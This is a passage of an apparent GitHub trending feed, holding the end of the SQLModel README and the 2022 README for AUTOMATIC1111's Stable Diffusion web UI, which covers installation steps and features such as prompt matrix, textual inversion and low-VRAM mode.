&#xA;&lt;h2&gt;Example&lt;/h2&gt; &#xA;&lt;p&gt;For an introduction to databases, SQL, and everything else, see the &lt;a href=&#34;https://sqlmodel.tiangolo.com&#34; target=&#34;_blank&#34;&gt;SQLModel documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s a quick example. âœ¨&lt;/p&gt; &#xA;&lt;h3&gt;A SQL Table&lt;/h3&gt; &#xA;&lt;p&gt;Imagine you have a SQL table called &lt;code&gt;hero&lt;/code&gt; with:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;name&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;secret_name&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;age&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;And you want it to have this data:&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;id&lt;/th&gt; &#xA;   &lt;th&gt;name&lt;/th&gt; &#xA;   &lt;th&gt;secret_name&lt;/th&gt; &#xA;   &lt;th&gt;age&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;   &lt;td&gt;Deadpond&lt;/td&gt; &#xA;   &lt;td&gt;Dive Wilson&lt;/td&gt; &#xA;   &lt;td&gt;null&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;   &lt;td&gt;Spider-Boy&lt;/td&gt; &#xA;   &lt;td&gt;Pedro Parqueador&lt;/td&gt; &#xA;   &lt;td&gt;null&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;Rusty-Man&lt;/td&gt; &#xA;   &lt;td&gt;Tommy Sharp&lt;/td&gt; &#xA;   &lt;td&gt;48&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Create a SQLModel Model&lt;/h3&gt; &#xA;&lt;p&gt;Then you could create a &lt;strong&gt;SQLModel&lt;/strong&gt; model like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Optional&#xA;&#xA;from sqlmodel import Field, SQLModel&#xA;&#xA;&#xA;class Hero(SQLModel, table=True):&#xA;    id: Optional[int] = Field(default=None, primary_key=True)&#xA;    name: str&#xA;    secret_name: str&#xA;    age: Optional[int] = None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That class &lt;code&gt;Hero&lt;/code&gt; is a &lt;strong&gt;SQLModel&lt;/strong&gt; model, the equivalent of a SQL table in Python code.&lt;/p&gt; &#xA;&lt;p&gt;And each of those class attributes is equivalent to each &lt;strong&gt;table column&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Create Rows&lt;/h3&gt; &#xA;&lt;p&gt;Then you could &lt;strong&gt;create each row&lt;/strong&gt; of the table as an &lt;strong&gt;instance&lt;/strong&gt; of the model:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;hero_1 = Hero(name=&#34;Deadpond&#34;, secret_name=&#34;Dive Wilson&#34;)&#xA;hero_2 = Hero(name=&#34;Spider-Boy&#34;, secret_name=&#34;Pedro Parqueador&#34;)&#xA;hero_3 = Hero(name=&#34;Rusty-Man&#34;, secret_name=&#34;Tommy Sharp&#34;, age=48)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This way, you can use conventional Python code with &lt;strong&gt;classes&lt;/strong&gt; and &lt;strong&gt;instances&lt;/strong&gt; that represent &lt;strong&gt;tables&lt;/strong&gt; and &lt;strong&gt;rows&lt;/strong&gt;, and that way communicate with the &lt;strong&gt;SQL database&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Editor Support&lt;/h3&gt; &#xA;&lt;p&gt;Everything is designed for you to get the best developer experience possible, with the best editor support.&lt;/p&gt; &#xA;&lt;p&gt;Including &lt;strong&gt;autocompletion&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;img class=&#34;shadow&#34; src=&#34;https://sqlmodel.tiangolo.com/img/index/autocompletion01.png&#34;&gt; &#xA;&lt;p&gt;And &lt;strong&gt;inline errors&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;img class=&#34;shadow&#34; src=&#34;https://sqlmodel.tiangolo.com/img/index/inline-errors01.png&#34;&gt; &#xA;&lt;h3&gt;Write to the Database&lt;/h3&gt; &#xA;&lt;p&gt;You can learn a lot more about &lt;strong&gt;SQLModel&lt;/strong&gt; by quickly following the &lt;strong&gt;tutorial&lt;/strong&gt;, but if you need a taste right now of how to put all that together and save to the database, you can do this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Optional&#xA;&#xA;from sqlmodel import Field, Session, SQLModel, create_engine&#xA;&#xA;&#xA;class Hero(SQLModel, table=True):&#xA;    id: Optional[int] = Field(default=None, primary_key=True)&#xA;    name: str&#xA;    secret_name: str&#xA;    age: Optional[int] = None&#xA;&#xA;&#xA;hero_1 = Hero(name=&#34;Deadpond&#34;, secret_name=&#34;Dive Wilson&#34;)&#xA;hero_2 = Hero(name=&#34;Spider-Boy&#34;, secret_name=&#34;Pedro Parqueador&#34;)&#xA;hero_3 = Hero(name=&#34;Rusty-Man&#34;, secret_name=&#34;Tommy Sharp&#34;, age=48)&#xA;&#xA;&#xA;engine = create_engine(&#34;sqlite:///database.db&#34;)&#xA;&#xA;&#xA;SQLModel.metadata.create_all(engine)&#xA;&#xA;with Session(engine) as session:&#xA;    session.add(hero_1)&#xA;    session.add(hero_2)&#xA;    session.add(hero_3)&#xA;    session.commit()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That will save a &lt;strong&gt;SQLite&lt;/strong&gt; database with the 3 heroes.&lt;/p&gt; &#xA;&lt;h3&gt;Select from the Database&lt;/h3&gt; &#xA;&lt;p&gt;Then you could write queries to select from that same database, for example with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Optional&#xA;&#xA;from sqlmodel import Field, Session, SQLModel, create_engine, select&#xA;&#xA;&#xA;class Hero(SQLModel, table=True):&#xA;    id: Optional[int] = Field(default=None, primary_key=True)&#xA;    name: str&#xA;    secret_name: str&#xA;    age: Optional[int] = None&#xA;&#xA;&#xA;engine = create_engine(&#34;sqlite:///database.db&#34;)&#xA;&#xA;with Session(engine) as session:&#xA;    statement = select(Hero).where(Hero.name == &#34;Spider-Boy&#34;)&#xA;    hero = session.exec(statement).first()&#xA;    print(hero)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Editor Support Everywhere&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;SQLModel&lt;/strong&gt; was carefully designed to give you the best developer experience and editor support, &lt;strong&gt;even after selecting data&lt;/strong&gt; from the database:&lt;/p&gt; &#xA;&lt;img class=&#34;shadow&#34; src=&#34;https://sqlmodel.tiangolo.com/img/index/autocompletion02.png&#34;&gt; &#xA;&lt;h2&gt;SQLAlchemy and Pydantic&lt;/h2&gt; &#xA;&lt;p&gt;That class &lt;code&gt;Hero&lt;/code&gt; is a &lt;strong&gt;SQLModel&lt;/strong&gt; model.&lt;/p&gt; &#xA;&lt;p&gt;But at the same time, âœ¨ it is a &lt;strong&gt;SQLAlchemy&lt;/strong&gt; model âœ¨. So, you can combine it and use it with other SQLAlchemy models, or you could easily migrate applications with SQLAlchemy to &lt;strong&gt;SQLModel&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;p&gt;And at the same time, âœ¨ it is also a &lt;strong&gt;Pydantic&lt;/strong&gt; model âœ¨. You can use inheritance with it to define all your &lt;strong&gt;data models&lt;/strong&gt; while avoiding code duplication. That makes it very easy to use with &lt;strong&gt;FastAPI&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;This project is licensed under the terms of the &lt;a href=&#34;https://github.com/tiangolo/sqlmodel/raw/main/LICENSE&#34;&gt;MIT license&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>AUTOMATIC1111/stable-diffusion-webui</title>
    <updated>2022-08-30T01:38:23Z</updated>
    <id>tag:github.com,2022-08-30:/AUTOMATIC1111/stable-diffusion-webui</id>
    <link href="https://github.com/AUTOMATIC1111/stable-diffusion-webui" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Stable Diffusion web UI&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Stable Diffusion web UI&lt;/h1&gt; &#xA;&lt;p&gt;A browser interface based on Gradio library for Stable Diffusion.&lt;/p&gt; &#xA;&lt;p&gt;Original script with Gradio UI was written by a kind anonymous user. This is a modification.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/screenshot.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installing and running&lt;/h2&gt; &#xA;&lt;h3&gt;Stable Diffusion&lt;/h3&gt; &#xA;&lt;p&gt;This script assumes that you already have main Stable Diffusion sutff installed, assumed to be in directory &lt;code&gt;/sd&lt;/code&gt;. If you don&#39;t have it installed, follow the guide:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://rentry.org/kretard&#34;&gt;https://rentry.org/kretard&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;This repository&#39;s &lt;code&gt;webgui.py&lt;/code&gt; is a replacement for &lt;code&gt;kdiff.py&lt;/code&gt; from the guide.&lt;/p&gt; &#xA;&lt;p&gt;Particularly, following files must exist:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/configs/stable-diffusion/v1-inference.yaml&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/models/ldm/stable-diffusion-v1/model.ckpt&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/ldm/util.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/k_diffusion/__init__.py&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;GFPGAN&lt;/h3&gt; &#xA;&lt;p&gt;If you want to use GFPGAN to improve generated faces, you need to install it separately. Follow instructions from &lt;a href=&#34;https://github.com/TencentARC/GFPGAN&#34;&gt;https://github.com/TencentARC/GFPGAN&lt;/a&gt;, but when cloning it, do so into Stable Diffusion main directory, &lt;code&gt;/sd&lt;/code&gt;. After that download &lt;a href=&#34;https://github.com/TencentARC/GFPGAN/releases/download/v1.3.0/GFPGANv1.3.pth&#34;&gt;GFPGANv1.3.pth&lt;/a&gt; and put it into the &lt;code&gt;/sd/GFPGAN/experiments/pretrained_models&lt;/code&gt; directory. If you&#39;re getting troubles with GFPGAN support, follow instructions from the GFPGAN&#39;s repository until &lt;code&gt;inference_gfpgan.py&lt;/code&gt; script works.&lt;/p&gt; &#xA;&lt;p&gt;The following files must exist:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/GFPGAN/inference_gfpgan.py&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;/sd/GFPGAN/experiments/pretrained_models/GFPGANv1.3.pth&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If the GFPGAN directory does not exist, you will not get the option to use GFPGAN in the UI. If it does exist, you will either be able to use it, or there will be a message in console with an error related to GFPGAN.&lt;/p&gt; &#xA;&lt;h3&gt;Web UI&lt;/h3&gt; &#xA;&lt;p&gt;Run the script as:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python webui.py&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;When running the script, you must be in the main Stable Diffusion directory, &lt;code&gt;/sd&lt;/code&gt;. If you cloned this repository into a subdirectory of &lt;code&gt;/sd&lt;/code&gt;, say, the &lt;code&gt;stable-diffusion-webui&lt;/code&gt; directory, you will run it as:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python stable-diffusion-webui/webui.py&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;When launching, you may get a very long warning message related to some weights not being used. You may freely ignore it. After a while, you will get a message like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Running on local URL:  http://127.0.0.1:7860/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Open the URL in browser, and you are good to go.&lt;/p&gt; &#xA;&lt;h2&gt;Features&lt;/h2&gt; &#xA;&lt;p&gt;The script creates a web UI for Stable Diffusion&#39;s txt2img and img2img scripts. Following are features added that are not in original script.&lt;/p&gt; &#xA;&lt;h3&gt;Extras tab&lt;/h3&gt; &#xA;&lt;p&gt;Additional neural network image improvement methods unrelated to stable diffusion.&lt;/p&gt; &#xA;&lt;h4&gt;GFPGAN&lt;/h4&gt; &#xA;&lt;p&gt;Lets you improve faces in pictures using the GFPGAN model. There is a checkbox in every tab to use GFPGAN at 100%, and also a separate tab that just allows you to use GFPGAN on any picture, with a slider that controls how strongthe effect is.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/GFPGAN.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Real-ESRGAN&lt;/h4&gt; &#xA;&lt;p&gt;Image upscaler. You can choose from multiple models by original author, and specify by how much the image should be upscaled. Requires &lt;code&gt;realesrgan&lt;/code&gt; librarty:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-commandline&#34;&gt;pip install realesrgan&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Sampling method selection&lt;/h3&gt; &#xA;&lt;p&gt;Pick out of multiple sampling methods for txt2img:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/sampling.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Prompt matrix&lt;/h3&gt; &#xA;&lt;p&gt;Separate multiple prompts using the &lt;code&gt;|&lt;/code&gt; character, and the system will produce an image for every combination of them. For example, if you use &lt;code&gt;a busy city street in a modern city|illustration|cinematic lighting&lt;/code&gt; prompt, there are four combinations possible (first part of prompt is always kept):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;a busy city street in a modern city&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;a busy city street in a modern city, illustration&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;a busy city street in a modern city, cinematic lighting&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;a busy city street in a modern city, illustration, cinematic lighting&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Four images will be produced, in this order, all with same seed and each with corresponding prompt: &lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/prompt-matrix.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Another example, this time with 5 prompts and 16 variations: &lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/prompt_matrix.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you use this feature, batch count will be ignored, because the number of pictures to produce depends on your prompts, but batch size will still work (generating multiple pictures at the same time for a small speed boost).&lt;/p&gt; &#xA;&lt;h3&gt;Flagging&lt;/h3&gt; &#xA;&lt;p&gt;Click the Flag button under the output section, and generated images will be saved to &lt;code&gt;log/images&lt;/code&gt; directory, and generation parameters will be appended to a csv file &lt;code&gt;log/log.csv&lt;/code&gt; in the &lt;code&gt;/sd&lt;/code&gt; directory.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;but every image is saved, why would I need this?&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;If you&#39;re like me, you experiment a lot with prompts and settings, and only few images are worth saving. You can just save them using right click in browser, but then you won&#39;t be able to reproduce them later because you will not know what exact prompt created the image. If you use the flag button, generation parameters will be written to csv file, and you can easily find parameters for an image by searching for its filename.&lt;/p&gt; &#xA;&lt;h3&gt;Copy-paste generation parameters&lt;/h3&gt; &#xA;&lt;p&gt;A text output provides generation parameters in an easy to copy-paste form for easy sharing.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/kopipe.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you generate multiple pictures, the displayed seed will be the seed of the first one.&lt;/p&gt; &#xA;&lt;h3&gt;Correct seeds for batches&lt;/h3&gt; &#xA;&lt;p&gt;If you use a seed of 1000 to generate two batches of two images each, four generated images will have seeds: &lt;code&gt;1000, 1001, 1002, 1003&lt;/code&gt;. Previous versions of the UI would produce &lt;code&gt;1000, x, 1001, x&lt;/code&gt;, where x is an image that can&#39;t be generated by any seed.&lt;/p&gt; &#xA;&lt;h3&gt;Resizing&lt;/h3&gt; &#xA;&lt;p&gt;There are three options for resizing input images in img2img mode:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Just resize - simply resizes source image to target resolution, resulting in incorrect aspect ratio&lt;/li&gt; &#xA; &lt;li&gt;Crop and resize - resize source image preserving aspect ratio so that entirety of target resolution is occupied by it, and crop parts that stick out&lt;/li&gt; &#xA; &lt;li&gt;Resize and fill - resize source image preserving aspect ratio so that it entirely fits target resolution, and fill empty space by rows/columns from source image&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Example: &lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/resizing.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Loading&lt;/h3&gt; &#xA;&lt;p&gt;Gradio&#39;s loading graphic has a very negative effect on the processing speed of the neural network. My RTX 3090 makes images about 10% faster when the tab with gradio is not active. By default, the UI now hides loading progress animation and replaces it with static &#34;Loading...&#34; text, which achieves the same effect. Use the &lt;code&gt;--no-progressbar-hiding&lt;/code&gt; commandline option to revert this and show loading animations.&lt;/p&gt; &#xA;&lt;h3&gt;Prompt validation&lt;/h3&gt; &#xA;&lt;p&gt;Stable Diffusion has a limit for input text length. If your prompt is too long, you will get a warning in the text output field, showing which parts of your text were truncated and ignored by the model.&lt;/p&gt; &#xA;&lt;h3&gt;Loopback&lt;/h3&gt; &#xA;&lt;p&gt;A checkbox for img2img allowing to automatically feed output image as input for the next batch. Equivalent to saving output image, and replacing input image with it. Batch count setting controls how many iterations of this you get.&lt;/p&gt; &#xA;&lt;p&gt;Usually, when doing this, you would choose one of many images for the next iteration yourself, so the usefulness of this feature may be questionable, but I&#39;ve managed to get some very nice outputs with it that I wasn&#39;t abble to get otherwise.&lt;/p&gt; &#xA;&lt;p&gt;Example: (cherrypicked result; original picture by anon)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/loopback.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Png info&lt;/h3&gt; &#xA;&lt;p&gt;Adds information about generation parameters to PNG as a text chunk. You can view this information later using any software that supports viewing PNG chunk info, for example: &lt;a href=&#34;https://www.nayuki.io/page/png-file-chunk-inspector&#34;&gt;https://www.nayuki.io/page/png-file-chunk-inspector&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/pnginfo.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Textual Inversion&lt;/h3&gt; &#xA;&lt;p&gt;Allows you to use pretrained textual inversion embeddings. See original site for details: &lt;a href=&#34;https://textual-inversion.github.io/&#34;&gt;https://textual-inversion.github.io/&lt;/a&gt;. I used lstein&#39;s repo for training embdedding: &lt;a href=&#34;https://github.com/lstein/stable-diffusion&#34;&gt;https://github.com/lstein/stable-diffusion&lt;/a&gt;; if you want to train your own, I recommend following the guide on his site.&lt;/p&gt; &#xA;&lt;p&gt;No additional libraries/repositories are required to use pretrained embeddings.&lt;/p&gt; &#xA;&lt;p&gt;To make use of pretrained embeddings, create &lt;code&gt;embeddings&lt;/code&gt; directory in the root dir of Stable Diffusion and put your embeddings into it. They must be .pt files about 5Kb in size, each with only one trained embedding, and the filename (without .pt) will be the term you&#39;d use in prompt to get that embedding.&lt;/p&gt; &#xA;&lt;p&gt;As an example, I trained one for about 5000 steps: &lt;a href=&#34;https://files.catbox.moe/e2ui6r.pt&#34;&gt;https://files.catbox.moe/e2ui6r.pt&lt;/a&gt;; it does not produce very good results, but it does work. Download and rename it to &lt;code&gt;Usada Pekora.pt&lt;/code&gt;, and put it into &lt;code&gt;embeddings&lt;/code&gt; dir and use Usada Pekora in prompt.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/inversion.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Settings&lt;/h3&gt; &#xA;&lt;p&gt;A tab with settings, allowing you to use UI to edit more than half of parameters that previously were commandline. Settings are saved to config.js file. Settings that remain as commandline options are ones that are required at startup.&lt;/p&gt; &#xA;&lt;h3&gt;Attention&lt;/h3&gt; &#xA;&lt;p&gt;Using &lt;code&gt;()&lt;/code&gt; in prompt decreases model&#39;s attention to enclosed words, and &lt;code&gt;[]&lt;/code&gt; increases it. You can combine multiple modifiers:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/attention-3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;SD upscale&lt;/h3&gt; &#xA;&lt;p&gt;Upscale image using RealESRGAN and then go through tiles of the result, improving them with img2img.&lt;/p&gt; &#xA;&lt;p&gt;Original idea by: &lt;a href=&#34;https://github.com/jquesnelle/txt2imghd&#34;&gt;https://github.com/jquesnelle/txt2imghd&lt;/a&gt;. This is an independent implementation.&lt;/p&gt; &#xA;&lt;p&gt;To use this feature, tick a checkbox in the img2img interface. Original image will be upscaled to twice the original width and height, while width and height sliders will specify the size of individual tiles. At the moment this method does not support batch size.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/sd-upscale.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;User scripts&lt;/h3&gt; &#xA;&lt;p&gt;If the program is launched with &lt;code&gt;--allow-code&lt;/code&gt; option, an extra text input field for script code is available in txt2img interface. It allows you to input python code that will do the work with image. If this field is not empty, the processing that would happen normally is skipped.&lt;/p&gt; &#xA;&lt;p&gt;In code, access parameters from web UI using the &lt;code&gt;p&lt;/code&gt; variable, and provide outputs for web UI using the &lt;code&gt;display(images, seed, info)&lt;/code&gt; function. All globals from script are also accessible.&lt;/p&gt; &#xA;&lt;p&gt;As an example, here is a script that draws a chart seen below (and also saves it as &lt;code&gt;test/gnomeplot/gnome5.png&lt;/code&gt;):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;steps = [4, 8,12,16, 20]&#xA;cfg_scales = [5.0,10.0,15.0]&#xA;&#xA;def cell(x, y, p=p):&#xA;&#x9;p.steps = x&#xA;&#x9;p.cfg_scale = y&#xA;&#x9;return process_images(p).images[0]&#xA;&#xA;images = [draw_xy_grid(&#xA;&#x9;xs = steps,&#xA;&#x9;ys = cfg_scales,&#xA;&#x9;x_label = lambda x: f&#39;Steps = {x}&#39;,&#xA;&#x9;y_label = lambda y: f&#39;CFG = {y}&#39;,&#xA;&#x9;cell = cell&#xA;)]&#xA;&#xA;save_image(images[0], &#39;test/gnomeplot&#39;, &#39;gnome5&#39;)&#xA;display(images)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AUTOMATIC1111/stable-diffusion-webui/master/images/scripting.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;A more simple script that would just process the image and output it normally:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;processed = process_images(p)&#xA;&#xA;print(&#34;Seed was: &#34; + str(processed.seed))&#xA;&#xA;display(processed.images, processed.seed, processed.info)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;code&gt;--lowvram&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Optimizations for GPUs with low VRAM. This should make it possible to generate 512x512 images on videocards with 4GB memory.&lt;/p&gt; &#xA;&lt;p&gt;The original idea of those optimizations is by basujindal: &lt;a href=&#34;https://github.com/basujindal/stable-diffusion&#34;&gt;https://github.com/basujindal/stable-diffusion&lt;/a&gt;. Model is separated into modules, and only one module is kept in GPU memory; when another module needs to run, the previous is removed from GPU memory.&lt;/p&gt; &#xA;&lt;p&gt;It should be obvious but the nature of those optimizations makes the processing run slower -- about 10 times slower compared to normal operation on my RTX 3090.&lt;/p&gt; &#xA;&lt;p&gt;This is an independent implementation that does not require any modification to original Stable Diffusion code, and with all code concenrated in one place rather than scattered around the program.&lt;/p&gt;</summary>
  </entry>
</feed>